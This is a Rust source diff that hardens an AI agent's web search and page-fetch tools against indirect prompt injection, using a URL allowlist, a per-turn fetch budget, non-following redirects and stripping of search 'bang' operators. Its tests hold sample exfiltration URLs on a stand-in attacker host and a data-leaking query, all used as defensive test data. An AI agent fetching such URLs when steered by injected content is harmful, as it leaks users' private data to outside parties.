@@ -4,8 +4,10 @@
 //! already runs (see `plugins/PLUGINS.md` §7); `fetch_url` downloads one page
 //! and extracts readable text from it. Both are plain HTTP calls, not
 //! sandboxed subprocesses, but `fetch_url`'s target ultimately comes from the
-//! model (a search result, or any page it has read) — indirect prompt
-//! injection can steer it — so every request (and every redirect hop, which
+//! model, and indirect prompt injection can steer it. So it opens only a URL
+//! the user gave or a search returned (`crate::agent::fetch_allowlist`), at
+//! most ten a turn, and `web_search` never follows the search service's
+//! redirects. On top of that, every request (and every redirect hop, which
 //! is why it has its own non-following client) is blocked from touching a
 //! loopback/private/link-local/CGNAT host, mirroring
 //! `crate::favicon`'s guard for the identical threat model, plus a DNS-resolve
@@ -13,6 +15,7 @@
 //! into the model's context, so a domain that merely *resolves* to an
 //! internal address must be blocked too, not just a literal internal IP).
 
+use super::super::fetch_allowlist::MAX_FETCHES_PER_TURN;
 use super::super::tool::{cap_output, ConsentSummary, Tool, ToolContext, ToolError, ToolOutput};
 use crate::types::ChatEvent;
 use kuchiki::{iter::NodeEdge, NodeData, NodeRef};
@@ -257,13 +260,10 @@ fn fetch_client() -> Option<&'static reqwest::Client> {
         .as_ref()
 }
 
-async fn guarded_get(client: &reqwest::Client, url: &str) -> Result<String, String> {
-    guarded_get_with(client, url, url_is_blocked).await
-}
-
-/// [`guarded_get`] with the block check passed in, so a test can treat one
-/// local server as public and another as internal.
-async fn guarded_get_with(
+/// GET `url`, refusing it and every redirect hop that `is_blocked` —
+/// [`url_is_blocked`] in production, swapped out by tests that need one
+/// local server treated as public and another as internal.
+async fn guarded_get(
     client: &reqwest::Client,
     url: &str,
     is_blocked: impl Fn(&reqwest::Url) -> bool,
@@ -305,18 +305,67 @@ async fn guarded_get_with(
     Err("That page redirected too many times.".to_string())
 }
 
+/// `web_search`'s own HTTP client. SearXNG answers an external bang (`!!g`)
+/// or a bare `!!` ("feeling lucky") with a redirect to another site carrying
+/// the query, so a client that followed it would send the model's query
+/// anywhere. This one follows nothing: a redirect comes back as an error
+/// status, and the only host a search ever reaches is the local service.
+fn search_client() -> Option<&'static reqwest::Client> {
+    static CLIENT: OnceLock<Option<reqwest::Client>> = OnceLock::new();
+    CLIENT
+        .get_or_init(|| {
+            reqwest::Client::builder()
+                .user_agent(concat!("OpenPal/", env!("CARGO_PKG_VERSION")))
+                .connect_timeout(Duration::from_secs(20))
+                .redirect(reqwest::redirect::Policy::none())
+                .build()
+                .ok()
+        })
+        .as_ref()
+}
+
+/// Drop SearXNG's `!` operators from a model-written query: every
+/// `!`-prefixed word (`!engine` picks an engine, `!!bang` redirects to an
+/// external site, wherever it sits in the query), then any `!` left inside a
+/// word, in case a separator Rust and SearXNG disagree on split it there.
+/// A search for the user never needs either.
+fn strip_search_operators(query: &str) -> String {
+    query
+        .split_whitespace()
+        .filter(|word| !word.starts_with('!'))
+        .map(|word| word.replace('!', ""))
+        .filter(|word| !word.is_empty())
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// The query a `web_search` call will actually send, or why it can't.
+fn search_query(args: &Value) -> Result<String, ToolError> {
+    let query = args
+        .get("query")
+        .and_then(Value::as_str)
+        .ok_or_else(|| ToolError::Rejected("A search needs a \"query\".".to_string()))?;
+    let query = strip_search_operators(query);
+    if query.is_empty() {
+        return Err(ToolError::Rejected(
+            "A search needs a \"query\" with words in it.".to_string(),
+        ));
+    }
+    Ok(query)
+}
+
 /// Search the web via the managed SearXNG instance. Registered only once its
 /// base URL has been resolved (`AgentDeps::search_service_url`), which needs
 /// the experimental `web-search` add-on turned on; see
-/// `PluginManager::ensure_capability_service`.
+/// `PluginManager::ensure_capability_service`. Takes no client: it always
+/// uses [`search_client`], which never follows a redirect.
 pub struct WebSearchTool {
     base_url: String,
-    http: reqwest::Client,
 }
 
 impl WebSearchTool {
-    pub fn new(base_url: String, http: reqwest::Client) -> Self {
-        Self { base_url, http }
+    pub fn new(base_url: String) -> Self {
+        Self { base_url }
     }
 }
 
@@ -345,13 +394,10 @@ impl Tool for WebSearchTool {
         args: &Value,
         _ctx: &ToolContext,
     ) -> Result<ConsentSummary, ToolError> {
-        let query = args
-            .get("query")
-            .and_then(Value::as_str)
-            .ok_or_else(|| ToolError::Rejected("A search needs a \"query\".".to_string()))?;
+        let query = search_query(args)?;
         Ok(ConsentSummary {
             summary: format!("Search the web for \"{query}\""),
-            detail: query.to_string(),
+            detail: query,
             resolved_paths: vec![],
             danger_flags: vec![],
         })
@@ -364,27 +410,28 @@ impl Tool for WebSearchTool {
         )
     }
 
-    // Read-only, sandboxed by the SSRF guard on any follow-up fetch, and the
-    // worst case is "sent a query string to the local search service" — no
-    // meaningful blast radius, so it doesn't need a per-query prompt (the old
-    // Python sidecar never asked one either; toggling web search on was
-    // always the user's consent).
+    // Read-only, and the worst case is "sent a query string to the local
+    // search service", which passes it on to the public engines it queries —
+    // the request never goes anywhere else, since `search_client` follows no
+    // redirect and `search_query` strips the `!!` bangs that would ask for
+    // one. Toggling web search on is the user's consent to that (the old
+    // Python sidecar never asked per query either).
     fn requires_consent(&self, _args: &Value, _ctx: &ToolContext) -> bool {
         false
     }
 
     async fn execute(&self, args: &Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
-        let query = args
-            .get("query")
-            .and_then(Value::as_str)
-            .ok_or_else(|| ToolError::Rejected("A search needs a \"query\".".to_string()))?;
+        let query = search_query(args)?;
+        let query = query.as_str();
 
         (ctx.on_event)(ChatEvent::SearchStarted {
             query: query.to_string(),
         });
 
-        let resp = self
-            .http
+        let client = search_client().ok_or_else(|| {
+            ToolError::ExecutionFailed("Couldn't reach the local search service.".to_string())
+        })?;
+        let resp = client
             .get(format!("{}/search", self.base_url))
             .query(&[
                 ("q", query),
@@ -429,6 +476,7 @@ impl Tool for WebSearchTool {
             if url.is_empty() {
                 continue;
             }
+            ctx.fetch_allowlist.allow_url(url);
             (ctx.on_event)(ChatEvent::SearchResult {
                 title: title.to_string(),
                 url: url.to_string(),
@@ -460,7 +508,33 @@ impl Tool for WebSearchTool {
 /// Fetch one URL and return its extracted readable text. Takes no client: it
 /// always uses [`fetch_client`], so nobody can hand it one that follows
 /// redirects past the per-hop check.
-pub struct FetchUrlTool;
+pub struct FetchUrlTool {
+    /// [`url_is_blocked`], except in tests that need a loopback listener to
+    /// stand in for a public site.
+    is_blocked: fn(&reqwest::Url) -> bool,
+}
+
+impl FetchUrlTool {
+    pub fn new() -> Self {
+        Self {
+            is_blocked: url_is_blocked,
+        }
+    }
+
+    /// A `FetchUrlTool` with its internal-network check swapped out — `|_|
+    /// false` lets a test serve pages from `127.0.0.1` without touching the
+    /// real network.
+    #[cfg(test)]
+    pub(crate) fn with_block_check(is_blocked: fn(&reqwest::Url) -> bool) -> Self {
+        Self { is_blocked }
+    }
+}
+
+impl Default for FetchUrlTool {
+    fn default() -> Self {
+        Self::new()
+    }
+}
 
 #[async_trait::async_trait]
 impl Tool for FetchUrlTool {
@@ -489,7 +563,7 @@ impl Tool for FetchUrlTool {
     fn consent_summary(
         &self,
         args: &Value,
-        _ctx: &ToolContext,
+        ctx: &ToolContext,
     ) -> Result<ConsentSummary, ToolError> {
         let url = args
             .get("url")
@@ -497,7 +571,26 @@ impl Tool for FetchUrlTool {
             .ok_or_else(|| ToolError::Rejected("A fetch needs a \"url\".".to_string()))?;
         let parsed = reqwest::Url::parse(url)
             .map_err(|_| ToolError::Rejected("That doesn't look like a valid URL.".to_string()))?;
-        if url_is_blocked(&parsed) {
+        // Both checks below come before `is_blocked`, which resolves the
+        // host: a `<secret>.attacker.example` host leaks through DNS alone.
+        let host = parsed.host_str().unwrap_or("");
+        if !ctx.fetch_allowlist.is_allowed(url) {
+            tracing::warn!("fetch_url refused a URL from an untrusted source (host {host})");
+            return Err(ToolError::Rejected(
+                "You can only open a URL the user gave you or one from web_search results. \
+                 Use web_search to find the page first, then fetch a URL exactly as it appears \
+                 in the results."
+                    .to_string(),
+            ));
+        }
+        if !ctx.fetch_allowlist.take_fetch() {
+            tracing::warn!("fetch_url refused past the per-turn budget (host {host})");
+            return Err(ToolError::Rejected(format!(
+                "You've already read {MAX_FETCHES_PER_TURN} pages this turn. Answer with what \
+                 you've found."
+            )));
+        }
+        if (self.is_blocked)(&parsed) {
             return Err(ToolError::Rejected(
                 "That address can't be reached from here.".to_string(),
             ));
@@ -517,10 +610,12 @@ impl Tool for FetchUrlTool {
         )
     }
 
-    // Same reasoning as `WebSearchTool::requires_consent`: read-only, and
-    // `consent_summary` above already rejects loopback/private/link-local
-    // targets before this is even reached, so there's no destructive or
-    // internal-network action left to gate behind a prompt.
+    // `consent_summary` above already refuses any URL that didn't come from
+    // the user or a search result, past the turn's budget, or on an internal
+    // host, before this is even reached. What's left is a read-only GET of a
+    // page the user effectively picked, so there's nothing to prompt for —
+    // and no prompt for the refused ones either: a card asking a beginner to
+    // judge an unfamiliar URL would be a worse guard than refusing it.
     fn requires_consent(&self, _args: &Value, _ctx: &ToolContext) -> bool {
         false
     }
@@ -536,7 +631,7 @@ impl Tool for FetchUrlTool {
         });
         let client = fetch_client()
             .ok_or_else(|| ToolError::ExecutionFailed("Couldn't reach that page.".to_string()))?;
-        let html = guarded_get(client, url)
+        let html = guarded_get(client, url, self.is_blocked)
             .await
             .map_err(ToolError::ExecutionFailed)?;
         let text = extract_text(&html);
@@ -583,9 +678,198 @@ impl Tool for FetchUrlTool {
     }
 }
 
+/// Local HTTP servers for tests that must never touch the real network.
+#[cfg(test)]
+pub(crate) mod test_server {
+    use std::io::{Read, Write};
+    use std::sync::{Arc, Mutex};
+
+    /// Serve every request with `respond(path)` (a full raw HTTP response) on
+    /// a fresh `127.0.0.1` port. Returns the port and the request targets
+    /// (path + query) received so far, in order.
+    pub(crate) fn serve(
+        respond: impl Fn(&str) -> String + Send + 'static,
+    ) -> (u16, Arc<Mutex<Vec<String>>>) {
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        let requests = Arc::new(Mutex::new(Vec::new()));
+        let seen = requests.clone();
+        std::thread::spawn(move || {
+            for stream in listener.incoming() {
+                let Ok(mut stream) = stream else { break };
+                let mut request = Vec::new();
+                let mut buf = [0u8; 1024];
+                loop {
+                    let n = stream.read(&mut buf).unwrap_or(0);
+                    request.extend_from_slice(&buf[..n]);
+                    if n == 0 || request.windows(4).any(|w| w == b"\r\n\r\n") {
+                        break;
+                    }
+                }
+                let request = String::from_utf8_lossy(&request);
+                let target = request.split_whitespace().nth(1).unwrap_or("/").to_string();
+                let response = respond(&target);
+                seen.lock().unwrap().push(target);
+                let _ = stream.write_all(response.as_bytes());
+            }
+        });
+        (port, requests)
+    }
+
+    pub(crate) fn ok_page(body: &str) -> String {
+        format!(
+            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+            body.len()
+        )
+    }
+
+    pub(crate) fn redirect_to(location: &str) -> String {
+        format!("HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::agent::consent::ConsentBroker;
+    use crate::agent::workspace::WorkspaceJail;
+    use std::sync::{atomic::AtomicBool, Arc};
+
+    fn ctx(tmp: &std::path::Path) -> ToolContext {
+        ToolContext {
+            turn_id: "t".into(),
+            call_id: "c1".into(),
+            workspace: Arc::new(
+                WorkspaceJail::new(
+                    tmp,
+                    std::path::Path::new("/nonexistent-home"),
+                    std::path::Path::new("/nonexistent-data"),
+                )
+                .unwrap(),
+            ),
+            scratch_dir: tmp.join(".scratch"),
+            cancel: Arc::new(AtomicBool::new(false)),
+            on_event: Arc::new(|_| {}),
+            citations: Arc::new(crate::agent::CitationRegistry::new()),
+            fetch_allowlist: Arc::new(crate::agent::FetchAllowlist::new()),
+            consent: Arc::new(ConsentBroker::new(tmp.join("grants.json"))),
+        }
+    }
+
+    /// The internal-network check resolves the host, so a URL nobody trusted
+    /// must be refused before it runs: `<secret>.attacker.example` would leak
+    /// through the DNS lookup alone.
+    #[test]
+    fn an_unknown_url_is_refused_before_its_host_is_resolved() {
+        let tmp = tempfile::tempdir().unwrap();
+        let tool = FetchUrlTool::with_block_check(|_| {
+            panic!("the host of an untrusted URL was looked up")
+        });
+        let result = tool.consent_summary(
+            &serde_json::json!({"url": "https://my-secret-plans.attacker.example/"}),
+            &ctx(tmp.path()),
+        );
+        assert!(
+            matches!(result, Err(ToolError::Rejected(reason)) if reason.contains("web_search"))
+        );
+    }
+
+    /// Collects every log message emitted while it's the thread's default.
+    struct CapturedLogs(std::sync::Mutex<Vec<String>>);
+
+    impl tracing::Subscriber for CapturedLogs {
+        fn enabled(&self, _: &tracing::Metadata<'_>) -> bool {
+            true
+        }
+        fn new_span(&self, _: &tracing::span::Attributes<'_>) -> tracing::span::Id {
+            tracing::span::Id::from_u64(1)
+        }
+        fn record(&self, _: &tracing::span::Id, _: &tracing::span::Record<'_>) {}
+        fn record_follows_from(&self, _: &tracing::span::Id, _: &tracing::span::Id) {}
+        fn event(&self, event: &tracing::Event<'_>) {
+            struct Message<'a>(&'a mut String);
+            impl tracing::field::Visit for Message<'_> {
+                fn record_debug(&mut self, _: &tracing::field::Field, value: &dyn std::fmt::Debug) {
+                    self.0.push_str(&format!("{value:?}"));
+                }
+            }
+            let mut message = String::new();
+            event.record(&mut Message(&mut message));
+            self.0.lock().unwrap().push(message);
+        }
+        fn enter(&self, _: &tracing::span::Id) {}
+        fn exit(&self, _: &tracing::span::Id) {}
+    }
+
+    #[test]
+    fn a_refused_fetch_logs_only_the_host() {
+        let tmp = tempfile::tempdir().unwrap();
+        let logs = Arc::new(CapturedLogs(std::sync::Mutex::new(Vec::new())));
+        tracing::subscriber::with_default(logs.clone(), || {
+            // Never resolve anything here, whatever the code under test does.
+            let tool = FetchUrlTool::with_block_check(|_| true);
+            let _ = tool.consent_summary(
+                &serde_json::json!({"url": "https://attacker.example/collect?d=my+secret+plans"}),
+                &ctx(tmp.path()),
+            );
+        });
+        let logs = logs.0.lock().unwrap();
+        assert!(logs.iter().any(|line| line.contains("attacker.example")));
+        assert!(!logs
+            .iter()
+            .any(|line| line.contains("secret") || line.contains("/collect")));
+    }
+
+    #[tokio::test]
+    async fn a_search_result_url_becomes_fetchable() {
+        let (search, _) = test_server::serve(|_| {
+            test_server::ok_page(
+                "{\"results\":[{\"title\":\"A\",\"url\":\"https://example.com/a\",\"content\":\"\"}]}",
+            )
+        });
+        let tmp = tempfile::tempdir().unwrap();
+        let ctx = ctx(tmp.path());
+        assert!(!ctx.fetch_allowlist.is_allowed("https://example.com/a"));
+
+        WebSearchTool::new(format!("http://127.0.0.1:{search}"))
+            .execute(&serde_json::json!({"query": "a"}), &ctx)
+            .await
+            .unwrap();
+
+        assert!(ctx.fetch_allowlist.is_allowed("https://example.com/a"));
+    }
+
+    /// SearXNG answers an external bang (`!!g ...`) with a `302` to that
+    /// site, query and all. The tool must stop at the redirect, and must not
+    /// send the bang in the first place.
+    #[tokio::test]
+    async fn a_search_service_redirect_is_not_followed() {
+        let (elsewhere, elsewhere_requests) =
+            test_server::serve(|_| test_server::ok_page("{\"results\":[]}"));
+        let (search, search_requests) = test_server::serve(move |_| {
+            test_server::redirect_to(&format!("http://127.0.0.1:{elsewhere}/?q=leaked"))
+        });
+        let tmp = tempfile::tempdir().unwrap();
+        let tool = WebSearchTool::new(format!("http://127.0.0.1:{search}"));
+
+        let result = tool
+            .execute(
+                &serde_json::json!({"query": "!!g my secret plans !ddg"}),
+                &ctx(tmp.path()),
+            )
+            .await;
+
+        assert!(result.is_err(), "a 302 from the search service is an error");
+        assert!(elsewhere_requests.lock().unwrap().is_empty());
+        let sent = search_requests.lock().unwrap();
+        assert_eq!(sent.len(), 1);
+        assert!(
+            !sent[0].contains("%21"),
+            "a `!` operator reached SearXNG: {}",
+            sent[0]
+        );
+        assert!(sent[0].contains("q=my+secret+plans&"));
+    }
 
     #[test]
     fn extract_text_drops_scripts_and_tags() {
@@ -684,75 +968,34 @@ mod tests {
         assert!(chunk_text("").is_empty());
     }
 
-    /// A local HTTP server answering every request with `respond(path)` (a
-    /// full raw response). Returns its port and how many connections it took.
-    fn serve(
-        respond: impl Fn(&str) -> String + Send + 'static,
-    ) -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
-        use std::io::{Read, Write};
-        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
-        let port = listener.local_addr().unwrap().port();
-        let hits = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
-        let counter = hits.clone();
-        std::thread::spawn(move || {
-            for stream in listener.incoming() {
-                let Ok(mut stream) = stream else { break };
-                counter.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
-                let mut request = Vec::new();
-                let mut buf = [0u8; 1024];
-                loop {
-                    let n = stream.read(&mut buf).unwrap_or(0);
-                    request.extend_from_slice(&buf[..n]);
-                    if n == 0 || request.windows(4).any(|w| w == b"\r\n\r\n") {
-                        break;
-                    }
-                }
-                let request = String::from_utf8_lossy(&request);
-                let path = request.split_whitespace().nth(1).unwrap_or("/");
-                let _ = stream.write_all(respond(path).as_bytes());
-            }
-        });
-        (port, hits)
-    }
-
-    fn ok_page(body: &str) -> String {
-        format!(
-            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
-            body.len()
-        )
-    }
-
-    fn redirect_to(location: &str) -> String {
-        format!("HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
-    }
-
     #[tokio::test]
     async fn redirect_to_a_blocked_host_is_refused_before_any_request() {
-        let (internal, internal_hits) = serve(|_| ok_page("internal secret"));
-        let (public, _) = serve(move |_| redirect_to(&format!("http://127.0.0.1:{internal}/")));
+        let (internal, internal_requests) =
+            test_server::serve(|_| test_server::ok_page("internal secret"));
+        let (public, _) = test_server::serve(move |_| {
+            test_server::redirect_to(&format!("http://127.0.0.1:{internal}/"))
+        });
         let blocked = move |u: &reqwest::Url| u.port() == Some(internal);
 
         let client = fetch_client().unwrap();
-        let result =
-            guarded_get_with(client, &format!("http://127.0.0.1:{public}/"), blocked).await;
+        let result = guarded_get(client, &format!("http://127.0.0.1:{public}/"), blocked).await;
 
         assert_eq!(
             result,
             Err("That address can't be reached from here.".to_string())
         );
-        assert_eq!(
-            internal_hits.load(std::sync::atomic::Ordering::SeqCst),
-            0,
+        assert!(
+            internal_requests.lock().unwrap().is_empty(),
             "the redirect target must never be contacted"
         );
     }
 
     /// `/hop/N` redirects to `/hop/N-1`; `/hop/0` is the page.
     fn hop_server() -> u16 {
-        serve(
+        test_server::serve(
             |path| match path.strip_prefix("/hop/").map(str::parse::<usize>) {
-                Some(Ok(0)) => ok_page("landed"),
-                Some(Ok(n)) => redirect_to(&format!("/hop/{}", n - 1)),
+                Some(Ok(0)) => test_server::ok_page("landed"),
+                Some(Ok(n)) => test_server::redirect_to(&format!("/hop/{}", n - 1)),
                 _ => "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n".to_string(),
             },
         )
@@ -763,7 +1006,7 @@ mod tests {
     async fn redirects_between_public_hosts_follow_up_to_the_limit() {
         let port = hop_server();
         let client = fetch_client().unwrap();
-        let result = guarded_get_with(
+        let result = guarded_get(
             client,
             &format!("http://127.0.0.1:{port}/hop/{MAX_REDIRECTS}"),
             |_| false,
@@ -776,7 +1019,7 @@ mod tests {
     async fn one_redirect_past_the_limit_is_refused() {
         let port = hop_server();
         let client = fetch_client().unwrap();
-        let result = guarded_get_with(
+        let result = guarded_get(
             client,
             &format!("http://127.0.0.1:{port}/hop/{}", MAX_REDIRECTS + 1),
             |_| false,
